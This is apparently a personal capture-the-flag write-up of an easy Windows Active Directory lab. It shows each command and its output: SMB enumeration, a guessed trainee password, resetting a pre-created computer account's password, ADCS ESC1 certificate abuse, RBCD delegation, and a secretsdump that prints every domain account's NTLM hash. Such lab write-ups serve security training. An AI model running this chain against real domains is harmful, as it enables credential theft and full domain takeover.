

## Lab Details
- Difficulty: Easy
- OS: Windows

## Summary
- Initial access: Active Directory Misconfiguration 
- Privilege escalation: ADCS ES1 

## Enumeration
#### Steps
- run `nmap`
```
$ sudo nmap 10.129.234.44 -p445,3389,139,135,53,593,389,52824,50600,636,88,49664,52811,9389,50591,49667,49668,52837,5985 -Pn  -sC -sV -A --host-timeout 15m
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-05 03:15 EDT
Nmap scan report for 10.129.234.44
Host is up (0.0046s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-05 07:15:33Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
445/tcp   open     microsoft-ds?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-05T07:16:26+00:00
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49664/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
50591/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
50600/tcp open     msrpc         Microsoft Windows RPC
52811/tcp open     msrpc         Microsoft Windows RPC
52824/tcp open     msrpc         Microsoft Windows RPC
52837/tcp filtered unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-05T07:16:26
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT     ADDRESS
1   1.74 ms 10.10.14.1
2   2.14 ms 10.129.234.44

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 219.55 seconds
```
- Enumerate the domain using `Enum4linux-ng`
```
$enum4linux-ng 10.129.234.44
ENUM4LINUX - next generation (v1.3.10)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.234.44
[*] Username ......... ''
[*] Random Username .. 'dwnwlxef'
[*] Password ......... ''
[*] Timeout .......... 10 second(s)

 ======================================
|    Listener Scan on 10.129.234.44    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.129.234.44    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: retro.vl

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.234.44    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.129.234.44    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.0.2: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ============================================================
|    Domain Information via SMB session for 10.129.234.44    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC
NetBIOS domain name: RETRO
DNS domain: retro.vl
FQDN: DC.retro.vl
Derived membership: domain member
Derived domain: RETRO

 ==========================================
|    RPC Session Check on 10.129.234.44    |
 ==========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[+] Server allows authentication via username 'dwnwlxef' and password ''
[H] Rerunning enumeration with user 'dwnwlxef' might give more results

 ====================================================
|    Domain Information via RPC for 10.129.234.44    |
 ====================================================
[+] Domain: RETRO
[+] Domain SID: S-1-5-21-2983547755-698260136-4283918172
[+] Membership: domain member

 ================================================
|    OS Information via RPC for 10.129.234.44    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '20348'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

 ======================================
|    Users via RPC on 10.129.234.44    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 =======================================
|    Groups via RPC on 10.129.234.44    |
 =======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 =======================================
|    Shares via RPC on 10.129.234.44    |
 =======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ==========================================
|    Policies via RPC for 10.129.234.44    |
 ==========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ==========================================
|    Printers via RPC for 10.129.234.44    |
 ==========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 37.56 seconds
```
- List SMB shares anonymously, found two non default shares
```
$smbclient -L //10.129.234.44/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Notes           Disk
        SYSVOL          Disk      Logon server share
        Trainees        Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.234.44 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
## Foothold

#### Steps
- Login to the `Trainees` share and download the important.txt file 
```
smbclient //10.129.234.44/Trainees -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 23 17:58:43 2023
  ..                                DHS        0  Wed Jun 11 10:17:10 2025
  Important.txt                       A      288  Sun Jul 23 18:00:13 2023

                4659711 blocks of size 4096. 1322972 blocks available
smb: \> mget important.txt
Get file Important.txt? yes
getting file \Important.txt of size 288 as Important.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> exit
```
- From the important.txt file we are told that the trainee accounts are with the same password 
```
$cat Important.txt
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins⏎
```
- Run `ldapsearch` anonymously and got invalid credential 
```
ldapsearch -H ldap://10.129.1.207 -x -b "dc=retro,dc=vl"
```
- Enumerate with guests access and found that we are able to authenticate as guest user
```
$nxc smb 10.129.234.44 -u 'a' -p '' --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\a: (Guest)
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share
SMB         10.129.234.44   445    DC               Notes
SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share
SMB         10.129.234.44   445    DC               Trainees        READ
```
- Perform `--rid-brute` using `nxc` and identified other AD users
```
$nxc smb 10.129.234.44 -u 'a' -p '' --rid-brute
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\a: (Guest)
SMB         10.129.234.44   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.129.234.44   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.129.234.44   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.129.234.44   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.129.234.44   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.44   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.44   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.129.234.44   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.129.234.44   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)
```
- Tested with `trainee : trainee` account and password combinations and account is valid
```
$nxc smb 10.129.234.44 -u 'trainee' -p 'trainee'
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee
```
- `trainee` user has access to Notes share 
```
$nxc smb 10.129.234.44 -u 'trainee' -p 'trainee' --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.234.44   445    DC               Notes           READ
SMB         10.129.234.44   445    DC               SYSVOL          READ            Logon server share
SMB         10.129.234.44   445    DC               Trainees        READ
```
- Download the files in the `Notes` share
```
$smbclient //10.129.234.44/Notes -U trainee
Password for [WORKGROUP\trainee]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr  8 23:12:49 2025
  ..                                DHS        0  Wed Jun 11 10:17:10 2025
  ToDo.txt                            A      248  Sun Jul 23 18:05:56 2023
  user.txt                            A       32  Tue Apr  8 23:13:01 2025

                4659711 blocks of size 4096. 1322464 blocks available
smb: \> mget *
Get file ToDo.txt? yes
getting file \ToDo.txt of size 248 as ToDo.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
Get file user.txt? yes
getting file \user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```
- The `ToDo.txt` states that there is an old computer account for the finance department
```
$cat ToDo.txt
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James⏎
```
- According to an article https://www.hackingarticles.in/pre2k-active-directory-misconfigurations/
- For old computer accounts their password is the name in lowercase 
```
$nxc smb 10.129.234.44 -u 'BANKING$' -p 'banking'
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```
- When authenticating we get a error `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`
- We can attempt to change the password using `changepasswd` from impacket
```
$changepasswd.py 'retro.vl/BANKING$@10.129.234.44' -newpass 'Password@987' -p rpc-samr
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

Current password:
[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
```
- Now we have a valid credential pair for user `banking$`
```
$nxc smb 10.129.234.44 -u 'BANKING$' -p 'Password@987'
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\BANKING$:Password@987
```
## Lateral Movement 

#### Steps


## Privilege Escalation

#### Steps
- Enumerate further we find a vulnerable certificate  
```
$certipy-ad find -u 'banking$' -p 'Password@987' -dc-ip 10.129.234.44 -stdout -
vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
- Which we can use to perform ESC1 to escalate privilege 
- First we want to request for a template (vulnerable template) as the `banking$` user with administrator's permission
```
$certipy-ad req -username 'banking$' -password 'Password@987' -ca retro-DC-CA -dc-ip 10.129.234.44 -template RetroClients -upn administrator@retro.vl -dns DC.retro.vl -debug -key-size 4096 -sid S-1-5-21-2983547755-698260136-4283918172-500
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Nameserver: '10.129.234.44'
[+] DC IP: '10.129.234.44'
[+] DC Host: None
[+] Target IP: '10.129.234.44'
[+] Remote Name: '10.129.234.44'
[+] Domain: ''
[+] Username: 'BANKING$'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
[*] Request ID is 11
[*] Successfully requested certificate
[*] Got certificate with multiple identities
    UPN: 'administrator@retro.vl'
    DNS Host Name: 'DC.retro.vl'
[+] Found SID in SAN URL: 'S-1-5-21-2983547755-698260136-4283918172-500'
[+] Found SID in security extension: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator_dc.pfx'
[+] Attempting to write data to 'administrator_dc.pfx'
[+] Data written to 'administrator_dc.pfx'
[*] Wrote certificate and private key to 'administrator_dc.pfx'
```
- Then use the `pfx` file to generate a key file
```
$ openssl pkcs12 -in administrator_authority.pfx -nocerts -out administrator.key

Enter Import Password: ## empty password

Enter PEM pass phrase:1234 ## anything

Verifying - Enter PEM pass phrase 
```
- We will also need a crt file 
```
$openssl pkcs12 -in ../administrator_dc.pfx -clcerts -nokeys -out administrator.crt
Enter Import Password:
```
- Then use we [`PassTheCert`](https://github.com/AlmondOffSec/PassTheCert) to perform RBDC and give delegation permissions to `banking$` from `DC$`
```
$python3 Python/passthecert.py -dc-ip 10.129.234.44 -crt administrator.crt -key administrator.key -domain retro.vl -port 636 -action write_rbcd -delegate-to 'DC$' -delegate-from 'banking$'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Enter PEM pass phrase:
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] banking$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     BANKING$     (S-1-5-21-2983547755-698260136-4283918172-1106)
```
- Using the delegation permission we can obtain a ticket as Administrator on DC
```
$getST.py -spn 'cifs/DC.retro.vl' -impersonate Administrator 'retro.vl/banking$:Password@987'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.retro.vl@RETRO.VL.ccache
```
- Use the ticket to dump the credentials
```
$export KRB5CCNAME=Administrator@cifs_DC.retro.vl@RETRO.VL.ccache;secretsdump.py -k -no-pass retro.vl/Administrator@dc.retro.vl -just-dc-ntlm
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e11fffd0ed83eedde12611fc2fbb8650:::
retro.vl\trainee:1104:aad3b435b51404eeaad3b435b51404ee:2a217a32bde94a23b26a8eea26c70874:::
retro.vl\jburley:1107:aad3b435b51404eeaad3b435b51404ee:38a7c1cf54d326ae1198a25067318b10:::
retro.vl\tblack:1109:aad3b435b51404eeaad3b435b51404ee:0adf9f3819565a0d0f3890290ecc3919:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:12c876af4deb1aedf56306edde6530b3:::
BANKING$:1106:aad3b435b51404eeaad3b435b51404ee:bd0f21ed526a885b378895679a412387:::
[*] Cleaning up...
```
## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: